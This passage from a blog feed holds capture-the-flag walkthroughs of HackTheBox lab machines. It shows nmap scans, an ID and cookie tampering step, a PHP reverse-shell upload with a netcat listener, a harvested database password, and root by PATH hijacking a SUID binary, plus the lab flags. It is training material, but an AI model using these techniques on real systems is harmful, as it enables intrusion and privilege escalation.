class="hljs-type">Not</span> <span class="hljs-type">shown</span>: <span class="hljs-number">62472</span> <span class="hljs-type">closed</span> <span class="hljs-type">tcp</span> <span class="hljs-type">ports</span> (<span class="hljs-type">reset</span>), <span class="hljs-number">3061</span> <span class="hljs-type">filtered</span> <span class="hljs-type">tcp</span> <span class="hljs-type">ports</span> (<span class="hljs-type">no</span>-<span class="hljs-type">response</span>)<span class="hljs-type">Some</span> <span class="hljs-type">closed</span> <span class="hljs-type">ports</span> <span class="hljs-type">may</span> <span class="hljs-type">be</span> <span class="hljs-type">reported</span> <span class="hljs-type">as</span> <span class="hljs-type">filtered</span> <span class="hljs-type">due</span> <span class="hljs-type">to</span> --<span class="hljs-type">defeat</span>-<span class="hljs-type">rst</span>-<span class="hljs-type">ratelimit</span><span class="hljs-type">PORT</span>   <span class="hljs-type">STATE</span> <span class="hljs-type">SERVICE</span> <span class="hljs-type">REASON</span><span class="hljs-number">22</span>/<span class="hljs-type">tcp</span> <span class="hljs-type">open</span>  <span class="hljs-type">ssh</span>     <span class="hljs-type">syn</span>-<span class="hljs-type">ack</span> <span class="hljs-type">ttl</span> <span class="hljs-number">63</span><span class="hljs-number">80</span>/<span class="hljs-type">tcp</span> <span class="hljs-type">open</span>  <span class="hljs-type">http</span>    <span class="hljs-type">syn</span>-<span class="hljs-type">ack</span> <span class="hljs-type">ttl</span> <span class="hljs-number">63</span><span class="hljs-type">Read</span> <span class="hljs-type">data</span> <span class="hljs-type">files</span> <span class="hljs-type">from</span>: /<span class="hljs-type">usr</span>/<span class="hljs-type">bin</span>/<span class="hljs-type">..</span>/<span class="hljs-type">share</span>/<span class="hljs-type">nmap</span><span class="hljs-type">Nmap</span> <span class="hljs-type">done</span>: <span class="hljs-number">1</span> <span class="hljs-type">IP</span> <span class="hljs-type">address</span> (<span class="hljs-number">1</span> <span class="hljs-type">host</span> <span class="hljs-type">up</span>) <span class="hljs-type">scanned</span> <span class="hljs-type">in</span> <span class="hljs-number">13.48</span> <span class="hljs-type">seconds</span>           <span class="hljs-type">Raw</span> <span class="hljs-type">packets</span> <span class="hljs-type">sent</span>: <span class="hljs-number">72205</span> (<span class="hljs-number">3.177</span><span class="hljs-type">MB</span>) | <span class="hljs-type">Rcvd</span>: <span class="hljs-number">65658</span> (<span class="hljs-number">2.626</span><span class="hljs-type">MB</span>)</code></pre><p>FULL NMAP Scanning: (scanning the ports we got)</p><pre><code class="hljs powershell">┌──(kali㉿kali)-[~/…/<span class="hljs-type">Workspace</span>/<span class="hljs-type">HTB</span>/<span class="hljs-type">starting</span>/<span class="hljs-type">oopsie</span>]└─<span class="hljs-variable">$</span> nmap <span class="hljs-literal">-A</span> <span class="hljs-literal">-sC</span> <span class="hljs-literal">-sV</span> <span class="hljs-literal">-p22</span>,<span class="hljs-number">80</span> <span class="hljs-number">10.129</span>.<span class="hljs-number">247.167</span> <span class="hljs-literal">-Pn</span>                                                    ]Starting Nmap <span class="hljs-number">7.94</span>SVN ( https://nmap.org ) at <span class="hljs-number">2024</span><span class="hljs-literal">-05-21</span> <span class="hljs-number">13</span>:<span class="hljs-number">43</span> EDTStats: <span class="hljs-number">0</span>:<span class="hljs-number">00</span>:<span class="hljs-number">00</span> elapsed; <span class="hljs-number">0</span> hosts completed (<span class="hljs-number">0</span> up), <span class="hljs-number">0</span> undergoing Script Pre<span class="hljs-literal">-Scan</span>NSE Timing: About <span class="hljs-number">0.00</span>% doneStats: <span class="hljs-number">0</span>:<span class="hljs-number">00</span>:<span class="hljs-number">06</span> elapsed; <span class="hljs-number">0</span> hosts completed (<span class="hljs-number">1</span> up), <span class="hljs-number">1</span> undergoing Service ScanService scan Timing: About <span class="hljs-number">50.00</span>% done; ETC: <span class="hljs-number">13</span>:<span class="hljs-number">43</span> (<span class="hljs-number">0</span>:<span class="hljs-number">00</span>:<span class="hljs-number">06</span> remaining)Nmap scan report <span class="hljs-keyword">for</span> <span class="hljs-number">10.129</span>.<span class="hljs-number">247.167</span>Host is up (<span class="hljs-number">0.045</span>s latency).PORT   STATE SERVICE VERSION<span class="hljs-number">22</span>/tcp open  ssh     OpenSSH <span class="hljs-number">7.6</span>p1 Ubuntu <span class="hljs-number">4</span>ubuntu0.<span class="hljs-number">3</span> (Ubuntu Linux; protocol <span class="hljs-number">2.0</span>)| ssh<span class="hljs-literal">-hostkey</span>: |   <span class="hljs-number">2048</span> <span class="hljs-number">61</span>:e4:<span class="hljs-number">3</span>f:d4:<span class="hljs-number">1</span>e:e2:b2:f1:<span class="hljs-number">0</span>d:<span class="hljs-number">3</span>c:ed:<span class="hljs-number">36</span>:<span class="hljs-number">28</span>:<span class="hljs-number">36</span>:<span class="hljs-number">67</span>:c7 (RSA)|   <span class="hljs-number">256</span> <span class="hljs-number">24</span>:<span class="hljs-number">1</span>d:a4:<span class="hljs-number">17</span>:d4:e3:<span class="hljs-number">2</span>a:<span class="hljs-number">9</span>c:<span class="hljs-number">90</span>:<span class="hljs-number">5</span>c:<span class="hljs-number">30</span>:<span class="hljs-number">58</span>:<span class="hljs-number">8</span>f:<span class="hljs-number">60</span>:<span class="hljs-number">77</span>:<span class="hljs-number">8</span>d (ECDSA)|_  <span class="hljs-number">256</span> <span class="hljs-number">78</span>:<span class="hljs-number">03</span>:<span class="hljs-number">0</span>e:b4:a1:af:e5:c2:f9:<span class="hljs-number">8</span>d:<span class="hljs-number">29</span>:<span class="hljs-number">05</span>:<span class="hljs-number">3</span>e:<span class="hljs-number">29</span>:c9:f2 (ED25519)<span class="hljs-number">80</span>/tcp open  http    Apache httpd <span class="hljs-number">2.4</span>.<span class="hljs-number">29</span> ((Ubuntu))|_http<span class="hljs-literal">-server-header</span>: Apache/<span class="hljs-number">2.4</span>.<span class="hljs-number">29</span> (Ubuntu)|_http<span class="hljs-literal">-title</span>: WelcomeService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: <span class="hljs-number">1</span> IP address (<span class="hljs-number">1</span> host up) scanned <span class="hljs-keyword">in</span> <span class="hljs-number">8.61</span> seconds</code></pre><p> With what kind of tool can intercept web traffic? </p><ul><li>proxy</li></ul><p> What is the path to the directory on the webserver that returns a login page? </p><p>Open ZAP → Open FoxyProxy Configuration → Refresh the page → Attack → Spider → </p><p><img src="/../oopsie_img/1.png" alt="alt text"></p><ul><li>&#x2F;cdn-cgi&#x2F;login</li></ul><p>Login as guest </p><p><img src="/../oopsie_img/2.png" alt="alt text"></p><p>If we hit <code>account</code> we can see in the URL that we have a value id set to <code>2</code> let’s try to change it to something like 1:</p><p><img src="/../oopsie_img/3.png" alt="alt text"></p><p>We change it to 1:</p><p>And we got the <code>name</code> admin .. interesting:</p><p><img src="/../oopsie_img/4.png" alt="alt text"></p><p>Check  &#x2F;uploads</p><p><img src="/../oopsie_img/5.png" alt="alt text"></p><p>Let’s intercept this with BurpSuite:</p><p><img src="/../oopsie_img/6.png" alt="alt text"></p><p>Send to repeater and modify user number to: <code>34322</code> (admin’s number) and role&#x3D;<code>admin</code> hit send:</p><p><img src="/../oopsie_img/7.png" alt="alt text"></p><p>Interesting.. now that we know it should work, go in the proxy tab modify the request to the admin’s number and role&#x3D; <code>admin</code> and hit forward:</p><p><img src="/../oopsie_img/8.png" alt="alt text"></p><p><strong>Voilà</strong></p><p><img src="/../oopsie_img/9.png" alt="alt text"></p><p>After we tried to upload something it didnt worked.. let’s try with inspect element</p><p>We changed the values here aswell:</p><p><img src="/../oopsie_img/10.png" alt="alt text"></p><p>We uploaded a php-reverse shell and it succeeded:</p><p><img src="/../oopsie_img/11.png" alt="alt text"></p><p>Of course we already set up our php reverse shell with our machine IP and the port we are going to listen:</p><p>Now we start a netcat on our kali:</p><pre><code class="hljs powershell">nc <span class="hljs-literal">-lvnp</span> <span class="hljs-number">6666</span></code></pre><p>Go into &#x2F;uploads&#x2F;php-reverse-shell.php</p><p><img src="/../oopsie_img/12.png" alt="alt text"></p><p>And we got shell </p><p><img src="/../oopsie_img/13.png" alt="alt text"></p><p>We forgot to answer some questions:</p><p> What is the access ID of the admin user? </p><ul><li>34322</li></ul><p> On uploading a file, what directory does that file appear in on the server? </p><ul><li>&#x2F;uploads</li></ul><h1 id="Privilege-Escalation"><a href="#Privilege-Escalation" class="headerlink" title="Privilege Escalation"></a>Privilege Escalation</h1><p>Spawning &#x2F;bin&#x2F;bash using python:</p><pre><code class="hljs powershell">python3 <span class="hljs-literal">-c</span> <span class="hljs-string">&#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span></code></pre><p><img src="/../oopsie_img/14.png" alt="alt text"></p><p>We find user flag: <code>f2c74ee8db7983851ab2a96a44eb7981</code></p><p>We have a hint on the site that we may find a password in the site code, let’s check the site from our shell:</p><pre><code class="hljs powershell">www<span class="hljs-literal">-data</span>@oopsie:/home/robert<span class="hljs-variable">$</span> <span class="hljs-built_in">cd</span> /var/www/html<span class="hljs-built_in">cd</span> /var/www/htmlwww<span class="hljs-literal">-data</span>@oopsie:/var/www/html<span class="hljs-variable">$</span> <span class="hljs-built_in">ls</span><span class="hljs-built_in">ls</span>cdn<span class="hljs-literal">-cgi</span>  css  fonts  images  index.php  js  themes  uploadswww<span class="hljs-literal">-data</span>@oopsie:/var/www/html<span class="hljs-variable">$</span> <span class="hljs-built_in">cd</span> cdn<span class="hljs-literal">-cgi</span><span class="hljs-built_in">cd</span> cdn<span class="hljs-literal">-cgi</span>www<span class="hljs-literal">-data</span>@oopsie:/var/www/html/cdn<span class="hljs-literal">-cgi</span><span class="hljs-variable">$</span> <span class="hljs-built_in">ls</span><span class="hljs-built_in">ls</span>loginwww<span class="hljs-literal">-data</span>@oopsie:/var/www/html/cdn<span class="hljs-literal">-cgi</span><span class="hljs-variable">$</span> <span class="hljs-built_in">cd</span> login<span class="hljs-built_in">cd</span> loginwww<span class="hljs-literal">-data</span>@oopsie:/var/www/html/cdn<span class="hljs-literal">-cgi</span>/login<span class="hljs-variable">$</span> <span class="hljs-built_in">ls</span><span class="hljs-built_in">ls</span>admin.php  db.php  index.php  script.jswww<span class="hljs-literal">-data</span>@oopsie:/var/www/html/cdn<span class="hljs-literal">-cgi</span>/login<span class="hljs-variable">$</span> <span class="hljs-built_in">cat</span> db.php<span class="hljs-built_in">cat</span> db.php&lt;?php<span class="hljs-variable">$conn</span> = mysqli_connect(<span class="hljs-string">&#x27;localhost&#x27;</span>,<span class="hljs-string">&#x27;robert&#x27;</span>,<span class="hljs-string">&#x27;M3g4C0rpUs3r!&#x27;</span>,<span class="hljs-string">&#x27;garage&#x27;</span>);?&gt;www<span class="hljs-literal">-data</span>@oopsie:/var/www/html/cdn<span class="hljs-literal">-cgi</span>/login<span class="hljs-variable">$</span> </code></pre><p>Found password : <code>M3g4C0rpUs3r!</code></p><p> What is the file that contains the password that is shared with the robert user? </p><ul><li>db.php</li></ul><p> What executible is run with the option “-group bugtracker” to identify all files owned by the bugtracker group? </p><p><img src="/../oopsie_img/15.png" alt="alt text"></p><pre><code class="hljs powershell">robert@oopsie:/home<span class="hljs-variable">$</span> find / <span class="hljs-literal">-group</span> bugtracker <span class="hljs-number">2</span>&gt;/dev/nullfind / <span class="hljs-literal">-group</span> bugtracker <span class="hljs-number">2</span>&gt;/dev/null/usr/bin/bugtracker</code></pre><ul><li>find</li></ul><p> Regardless of which user starts running the bugtracker executable, what’s user privileges will use to run? </p><ul><li>root</li></ul><p>What SUID stands for ?</p><ul><li>Set owner User ID</li></ul><p> What is the name of the executable being called in an insecure manner? </p><ul><li>cat</li></ul><p><img src="/../oopsie_img/16.png" alt="alt text"></p><p>We get an error from the cat command, essentially, the bugtracker is functioning as a front-end for the <strong><code>cat</code></strong> command, fetching files from the <strong><code>/root/reports/</code></strong> directory and adding the bug ID to access them.</p><p>We’ll create a new cat file that will spawn a shell when it is ran:</p><pre><code class="hljs powershell">robert@oopsie:/tmp<span class="hljs-variable">$</span> <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;/bin/sh&quot;</span> &gt; <span class="hljs-built_in">cat</span><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;/bin/sh&quot;</span> &gt; <span class="hljs-built_in">cat</span>robert@oopsie:/tmp<span class="hljs-variable">$</span> chmod +x <span class="hljs-built_in">cat</span>chmod +x <span class="hljs-built_in">cat</span>robert@oopsie:/tmp<span class="hljs-variable">$</span> export PATH=/tmp:<span class="hljs-variable">$PATH</span>export PATH=/tmp:<span class="hljs-variable">$PATH</span>robert@oopsie:/tmp<span class="hljs-variable">$</span> <span class="hljs-built_in">echo</span> <span class="hljs-variable">$PATH</span><span class="hljs-built_in">echo</span> <span class="hljs-variable">$PATH</span>/tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/gamesrobert@oopsie:/tmp<span class="hljs-variable">$</span> </code></pre><p>Run bugtracker:</p><pre><code class="hljs powershell">robert@oopsie:/tmp<span class="hljs-variable">$</span> bugtrackerbugtracker<span class="hljs-literal">------------------</span>: EV Bug Tracker :<span class="hljs-literal">------------------</span>Provide Bug ID: <span class="hljs-number">3</span><span class="hljs-number">3</span><span class="hljs-literal">---------------</span><span class="hljs-comment"># whoami</span>whoamiroot<span class="hljs-comment"># </span></code></pre><p><img src="/../oopsie_img/17.png" alt="alt text"></p><p>Root Flag: <code>af13b0bee69f8a877c3faf667f7beacf</code></p>]]></content>
      
      
      
        <tags>
            
            <tag> HackTheBox </tag>
            
            <tag> Very Easy </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Archetype</title>
      <link href="/2024/05/24/Archetype/"/>
      <url>/2024/05/24/Archetype/</url>
      
        <content type="html"><![CDATA[<p><img src="/../archetype_img/archetype.png" alt="alt text"></p><p>Machine IP: 10.129.95.187</p><h1 id="Information-Gathering"><a href="#Information-Gathering" class="headerlink" title="Information Gathering"></a>Information Gathering</h1><h2 id="NMAP-Scanning"><a href="#NMAP-Scanning" class="headerlink" title="NMAP Scanning :"></a>NMAP Scanning :</h2><pre><code class="hljs powershell">┌──(kali㉿kali)-[~/<span class="hljs-type">Desktop</span>/<span class="hljs-type">Workspace</span>]└─<span class="hljs-variable">$</span> sudo nmap <span class="hljs-literal">-p-</span> <span class="hljs-literal">-sS</span> <span class="hljs-literal">--min-rate</span> <span class="hljs-number">5000</span> <span class="hljs-literal">--open</span> <span class="hljs-literal">-T5</span> <span class="hljs-literal">-vvv</span> <span class="hljs-literal">-Pn</span> <span class="hljs-number">10.129</span>.<span class="hljs-number">95.187</span> [<span class="hljs-type">sudo</span>] password <span class="hljs-keyword">for</span> kali: Host discovery disabled (<span class="hljs-literal">-Pn</span>). All addresses will be marked <span class="hljs-string">&#x27;up&#x27;</span> and scan times may be slower.Starting Nmap <span class="hljs-number">7.94</span>SVN ( https://nmap.org ) at <span class="hljs-number">2024</span><span class="hljs-literal">-05-20</span> <span class="hljs-number">20</span>:<span class="hljs-number">55</span> EDTInitiating Parallel DNS resolution of <span class="hljs-number">1</span> host. at <span class="hljs-number">20</span>:<span class="hljs-number">55</span>Completed Parallel DNS resolution of <span class="hljs-number">1</span> host. at <span class="hljs-number">20</span>:<span class="hljs-number">55</span>, <span class="hljs-number">0.10</span>s elapsedDNS resolution of <span class="hljs-number">1</span> IPs took <span class="hljs-number">0.10</span>s. Mode: Async [<span class="hljs-comment">#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]</span><span class="hljs-type">Initiating</span> <span class="hljs-type">SYN</span> <span class="hljs-type">Stealth</span> <span class="hljs-type">Scan</span> <span class="hljs-type">at</span> <span class="hljs-number">20</span>:<span class="hljs-number">55</span><span class="hljs-type">Scanning</span> <span class="hljs-number">10.129</span><span class="hljs-type">.95.187</span> [<span class="hljs-number">65535</span> <span class="hljs-type">ports</span>]<span class="hljs-type">Discovered</span> <span class="hljs-type">open</span> <span class="hljs-type">port</span> <span class="hljs-number">139</span>/<span class="hljs-type">tcp</span> <span class="hljs-type">on</span> <span class="hljs-number">10.129</span><span class="hljs-type">.95.187</span><span class="hljs-type">Discovered</span> <span class="hljs-type">open</span> <span class="hljs-type">port</span> <span class="hljs-number">135</span>/<span class="hljs-type">tcp</span> <span class="hljs-type">on</span> <span class="hljs-number">10.129</span><span class="hljs-type">.95.187</span><span class="hljs-type">Discovered</span> <span class="hljs-type">open</span> <span class="hljs-type">port</span> <span class="hljs-number">445</span>/<span class="hljs-type">tcp</span> <span class="hljs-type">on</span> <span class="hljs-number">10.129</span><span class="hljs-type">.95.187</span><span class="hljs-type">Discovered</span> <span class="hljs-type">open</span> <span class="hljs-type">port</span> <span class="hljs-number">5985</span>/<span class="hljs-type">tcp</span> <span class="hljs-type">on</span> <span class="hljs-number">10.129</span><span class="hljs-type">.95.187</span><span class="hljs-type">Discovered</span> <span class="hljs-type">open</span> <span class="hljs-type">port</span> <span class="hljs-number">47001</span>/<span class="hljs-type">tcp</span> <span class="hljs-type">on</span> <span class="hljs-number">10.129</span><span class="hljs-type">.95.187</span><span class="hljs-type">Discovered</span> <span class="hljs-type">open</span> <span class="hljs-type">port</span> <span class="hljs-number">49669</span>/<span class="hljs-type">tcp</span> <span class="hljs-type">on</span> <span class="hljs-number">10.129</span><span class="hljs-type">.95.187</span><span class="hljs-type">Discovered</span> <span class="hljs-type">open</span> <span class="hljs-type">port</span> <span class="hljs-number">49668</span>/<span class="hljs-type">tcp</span> <span class="hljs-type">on</span> <span class="hljs-number">10.129</span><span class="hljs-type">.95.187</span><span class="hljs-type">Discovered</span> <span class="hljs-type">open</span> <span class="hljs-type">port</span> <span class="hljs-number">1433</span>/<span class="hljs-type">tcp</span> <span class="hljs-type">on</span> <span class="hljs-number">10.129</span><span class="hljs-type">.95.187</span><span class="hljs-type">Discovered</span> <span class="hljs-type">open</span> <span class="hljs-type">port</span> <span class="hljs-number">49666</span>/<span class="hljs-type">tcp</span> <span class="hljs-type">on</span> <span class="hljs-number">10.129</span><span class="hljs-type">.95.187</span><span class="hljs-type">Discovered</span> <span class="hljs-type">open</span> <span class="hljs-type">port</span> <span class="hljs-number">49665</span>/<span class="hljs-type">tcp</span> <span class="hljs-type">on</span> <span class="hljs-number">10.129</span><span class="hljs-type">.95.187</span><span class="hljs-type">Discovered</span> <span class="hljs-type">open</span> <span class="hljs-type">port</span> <span class="hljs-number">49667</span>/<span class="hljs-type">tcp</span> <span class="hljs-type">on</span> <span class="hljs-number">10.129</span><span class="hljs-type">.95.187</span><span class="hljs-type">Completed</span> <span class="hljs-type">SYN</span> <span class="hljs-type">Stealth</span> <span class="hljs-type">Scan</span> <span class="hljs-type">at</span> <span class="hljs-number">20</span>:<span class="hljs-number">56</span>, <span class="hljs-number">22.51</span><span class="hljs-type">s</span> <span class="hljs-type">elapsed</span> (<span class="hljs-number">65535</span> <span class="hljs-type">total</span> <span class="hljs-type">ports</span>)<span class="hljs-type">Nmap</span> <span class="hljs-type">scan</span> <span class="hljs-type">report</span> <span class="hljs-type">for</span> <span class="hljs-number">10.129</span><span class="hljs-type">.95.187</span><span class="hljs-type">Host</span> <span class="hljs-type">is</span> <span class="hljs-type">up</span>, <span class="hljs-type">received</span> <span class="hljs-type">user</span>-<span class="hljs-type">set</span> (<span class="hljs-number">0.087</span><span class="hljs-type">s</span> <span class="hljs-type">latency</span>)<span class="hljs-type">.</span><span class="hljs-type">Scanned</span> <span class="hljs-type">at</span> <span class="hljs-number">2024</span>-<span class="hljs-number">05</span>-<span class="hljs-number">20</span> <span class="hljs-number">20</span>:<span class="hljs-number">55</span>:<span class="hljs-number">41</span> <span class="hljs-type">EDT</span> <span class="hljs-type">for</span> <span class="hljs-number">22</span><span class="hljs-type">s</span><span class="hljs-type">Not</span> <span class="hljs-type">shown</span>: <span class="hljs-number">62292</span> <span class="hljs-type">closed</span> <span class="hljs-type">tcp</span> <span class="hljs-type">ports</span> (<span class="hljs-type">reset</span>), <span class="hljs-number">3232</span> <span class="hljs-type">filtered</span> <span class="hljs-type">tcp</span> <span class="hljs-type">ports</span> (<span class="hljs-type">no</span>-<span class="hljs-type">response</span>)<span class="hljs-type">Some</span> <span class="hljs-type">closed</span> <span class="hljs-type">ports</span> <span class="hljs-type">may</span> <span class="hljs-type">be</span> <span class="hljs-type">reported</span> <span class="hljs-type">as</span> <span class="hljs-type">filtered</span> <span class="hljs-type">due</span> <span class="hljs-type">to</span> --<span class="hljs-type">defeat</span>-<span class="hljs-type">rst</span>-<span class="hljs-type">ratelimit</span><span class="hljs-type">PORT</span>      <span class="hljs-type">STATE</span> <span class="hljs-type">SERVICE</span>      <span class="hljs-type">REASON</span><span class="hljs-number">135</span>/<span class="hljs-type">tcp</span>   <span class="hljs-type">open</span>  <span class="hljs-type">msrpc</span>        <span class="hljs-type">syn</span>-<span class="hljs-type">ack</span> <span class="hljs-type">ttl</span> <span class="hljs-number">127</span><span class="hljs-number">139</span>/<span class="hljs-type">tcp</span>   <span class="hljs-type">open</span>  <span class="hljs-type">netbios</span>-<span class="hljs-type">ssn</span>  <span class="hljs-type">syn</span>-<span class="hljs-type">ack</span> <span class="hljs-type">ttl</span> <span class="hljs-number">127</span><span class="hljs-number">445</span>/<span class="hljs-type">tcp</span>   <span class="hljs-type">open</span>  <span class="hljs-type">microsoft</span>-<span class="hljs-type">ds</span> <span class="hljs-type">syn</span>-<span class="hljs-type">ack</span> <span class="hljs-type">ttl</span> <span class="hljs-number">127</span><span class="hljs-number">1433</span>/<span class="hljs-type">tcp</span>  <span class="hljs-type">open</span>  <span class="hljs-type">ms</span>-<span class="hljs-type">sql</span>-<span class="hljs-type">s</span>     <span class="hljs-type">syn</span>-<span class="hljs-type">ack</span> <span class="hljs-type">ttl</span> <span class="hljs-number">127</span><span class="hljs-number">5985</span>/<span class="hljs-type">tcp</span>  <span class="hljs-type">open</span>  <span class="hljs-type">wsman</span>        <span class="hljs-type">syn</span>-<span class="hljs-type">ack</span> <span class="hljs-type">ttl</span> <span class="hljs-number">127</span><span class="hljs-number">47001</span>/<span class="hljs-type">tcp</span> <span class="hljs-type">open</span>  <span class="hljs-type">winrm</span>        <span class="hljs-type">syn</span>-<span class="hljs-type">ack</span> <span class="hljs-type">ttl</span> <span class="hljs-number">127</span><span class="hljs-number">49665</span>/<span class="hljs-type">tcp</span> <span class="hljs-type">open</span>  <span class="hljs-type">unknown</span>      <span class="hljs-type">syn</span>-<span class="hljs-type">ack</span> <span class="hljs-type">ttl</span> <span class="hljs-number">127</span><span class="hljs-number">49666</span>/<span class="hljs-type">tcp</span> <span class="hljs-type">open</span>  <span class="hljs-type">unknown</span>      <span class="hljs-type">syn</span>-<span class="hljs-type">ack</span> <span class="hljs-type">ttl</span> <span class="hljs-number">127</span><span class="hljs-number">49667</span>/<span class="hljs-type">tcp</span> <span class="hljs-type">open</span>  <span class="hljs-type">unknown</span>      <span class="hljs-type">syn</span>-<span class="hljs-type">ack</span> <span class="hljs-type">ttl</span> <span class="hljs-number">127</span><span class="hljs-number">49668</span>/<span class="hljs-type">tcp</span> <span class="hljs-type">open</span>  <span class="hljs-type">unknown</span>      <span class="hljs-type">syn</span>-<span class="hljs-type">ack</span> <span class="hljs-type">ttl</span> <span class="hljs-number">127</span><span class="hljs-number">49669</span>/<span class="hljs-type">tcp</span> <span class="hljs-type">open</span>  <span class="hljs-type">unknown</span>      <span class="hljs-type">syn</span>-<span class="hljs-type">ack</span> <span class="hljs-type">ttl</span> <span class="hljs-number">127</span><span class="hljs-type">Read</span> <span class="hljs-type">data</span> <span class="hljs-type">files</span> <span class="hljs-type">from</span>: /<span class="hljs-type">usr</span>/<span class="hljs-type">bin</span>/<span class="hljs-type">..</span>/<span class="hljs-type">share</span>/<span class="hljs-type">nmap</span><span class="hljs-type">Nmap</span> <span class="hljs-type">done</span>: <span class="hljs-number">1</span> <span class="hljs-type">IP</span> <span class="hljs-type">address</span> (<span class="hljs-number">1</span> <span class="hljs-type">host</span> <span class="hljs-type">up</span>) <span class="hljs-type">scanned</span> <span class="hljs-type">in</span> <span class="hljs-number">22.73</span> <span class="hljs-type">seconds</span>           <span class="hljs-type">Raw</span> <span class="hljs-type">packets</span> <span class="hljs-type">sent</span>: <span class="hljs-number">107020</span> (<span class="hljs-number">4.709</span><span class="hljs-type">MB</span>) | <span class="hljs-type">Rcvd</span>: <span class="hljs-number">88091</span> (<span class="hljs-number">3.524</span><span class="hljs-type">MB</span>)</code></pre><p>FULL NMAP Scanning: (scanning the ports we got)</p><pre><code class="hljs powershell">┌──(kali㉿kali)-[~]└─<span class="hljs-variable">$</span> nmap <span class="hljs-literal">-A</span> <span class="hljs-literal">-sC</span> <span class="hljs-literal">-sV</span> <span class="hljs-literal">-p139</span>,<span class="hljs-number">135</span>,<span class="hljs-number">445</span>,<span class="hljs-number">5985</span>,<span class="hljs-number">47001</span>,<span class="hljs-number">49669</span>,<span class="hljs-number">49668</span>,<span class="hljs-number">1433</span>,<span class="hljs-number">49666</span>,<span class="hljs-number">49665</span>,<span class="hljs-number">49667</span>  <span class="hljs-number">10.129</span>.<span class="hljs-number">95.187</span> <span class="hljs-literal">-Pn</span>Starting Nmap <span class="hljs-number">7.94</span>SVN ( https://nmap.org ) at <span class="hljs-number">2024</span><span class="hljs-literal">-05-20</span> <span class="hljs-number">20</span>:<span class="hljs-number">57</span> EDTNmap scan report <span class="hljs-keyword">for</span> <span class="hljs-number">10.129</span>.<span class="hljs-number">95.187</span>Host is up (<span class="hljs-number">0.080</span>s latency).PORT      STATE SERVICE      VERSION<span class="hljs-number">135</span>/tcp   open  msrpc        Microsoft Windows RPC<span class="hljs-number">139</span>/tcp   open  netbios<span class="hljs-literal">-ssn</span>  Microsoft Windows netbios<span class="hljs-literal">-ssn</span><span class="hljs-number">445</span>/tcp   open  microsoft<span class="hljs-literal">-ds</span> Windows Server <span class="hljs-number">2019</span> Standard <span class="hljs-number">17763</span> microsoft<span class="hljs-literal">-ds</span><span class="hljs-number">1433</span>/tcp  open  ms<span class="hljs-literal">-sql-s</span>     Microsoft SQL Server <span class="hljs-number">2017</span> <span class="hljs-number">14.00</span>.<span class="hljs-number">1000.00</span>; RTM| ms<span class="hljs-literal">-sql-info</span>: |   <span class="hljs-number">10.129</span>.<span class="hljs-number">95.187</span>:<span class="hljs-number">1433</span>: |     Version: |       name: Microsoft SQL Server <span class="hljs-number">2017</span> RTM|       number: <span class="hljs-number">14.00</span>.<span class="hljs-number">1000.00</span>|       Product: Microsoft SQL Server <span class="hljs-number">2017</span>|       Service pack level: RTM|       Post<span class="hljs-literal">-SP</span> patches applied: false|_    TCP port: <span class="hljs-number">1433</span>| ms<span class="hljs-literal">-sql-ntlm-info</span>: |   <span class="hljs-number">10.129</span>.<span class="hljs-number">95.187</span>:<span class="hljs-number">1433</span>: |     Target_Name: ARCHETYPE|     NetBIOS_Domain_Name: ARCHETYPE|     NetBIOS_Computer_Name: ARCHETYPE|     DNS_Domain_Name: Archetype|     DNS_Computer_Name: Archetype|_    Product_Version: <span class="hljs-number">10.0</span>.<span class="hljs-number">17763</span>| ssl<span class="hljs-literal">-cert</span>: Subject: commonName=SSL_Self_Signed_Fallback| Not valid before: <span class="hljs-number">2024</span><span class="hljs-literal">-05-21T00</span>:<span class="hljs-number">48</span>:<span class="hljs-number">02</span>|_Not valid after:  <span class="hljs-number">2054</span><span class="hljs-literal">-05-21T00</span>:<span class="hljs-number">48</span>:<span class="hljs-number">02</span>|_ssl<span class="hljs-literal">-date</span>: <span class="hljs-number">2024</span><span class="hljs-literal">-05-21T00</span>:<span class="hljs-number">59</span>:<span class="hljs-number">08</span>+<span class="hljs-number">00</span>:<span class="hljs-number">00</span>; <span class="hljs-number">0</span>s from scanner time.<span class="hljs-number">5985</span>/tcp  open  http         Microsoft HTTPAPI httpd <span class="hljs-number">2.0</span> (SSDP/UPnP)|_http<span class="hljs-literal">-server-header</span>: Microsoft<span class="hljs-literal">-HTTPAPI</span>/<span class="hljs-number">2.0</span>|_http<span class="hljs-literal">-title</span>: Not Found<span class="hljs-number">47001</span>/tcp open  http         Microsoft HTTPAPI httpd <span class="hljs-number">2.0</span> (SSDP/UPnP)|_http<span class="hljs-literal">-server-header</span>: Microsoft<span class="hljs-literal">-HTTPAPI</span>/<span class="hljs-number">2.0</span>|_http<span class="hljs-literal">-title</span>: Not Found<span class="hljs-number">49665</span>/tcp open  msrpc        Microsoft Windows RPC<span class="hljs-number">49666</span>/tcp open  msrpc        Microsoft Windows RPC<span class="hljs-number">49667</span>/tcp open  msrpc        Microsoft Windows RPC<span class="hljs-number">49668</span>/tcp open  msrpc        Microsoft Windows RPC<span class="hljs-number">49669</span>/tcp open  msrpc        Microsoft Windows RPCService Info: OSs: Windows, Windows Server <span class="hljs-number">2008</span> R2 - <span class="hljs-number">2012</span>; CPE: cpe:/o:microsoft:windowsHost script results:| smb<span class="hljs-literal">-os-discovery</span>: |   OS: Windows Server <span class="hljs-number">2019</span> Standard <span class="hljs-number">17763</span> (Windows Server <span class="hljs-number">2019</span> Standard <span class="hljs-number">6.3</span>)|   Computer name: Archetype|   NetBIOS computer name: ARCHETYPE\x00|   Workgroup: WORKGROUP\x00|_  System time: <span class="hljs-number">2024</span><span class="hljs-literal">-05-20T17</span>:<span class="hljs-number">58</span>:<span class="hljs-number">56</span><span class="hljs-literal">-07</span>:<span class="hljs-number">00</span>| smb2<span class="hljs-literal">-time</span>: |   date: <span class="hljs-number">2024</span><span class="hljs-literal">-05-21T00</span>:<span class="hljs-number">58</span>:<span class="hljs-number">58</span>|_  start_date: N/A| smb<span class="hljs-literal">-security-mode</span>: |   account_used: guest|   authentication_level: user|   challenge_response: supported|_  message_signing: disabled (dangerous, but default)| smb2<span 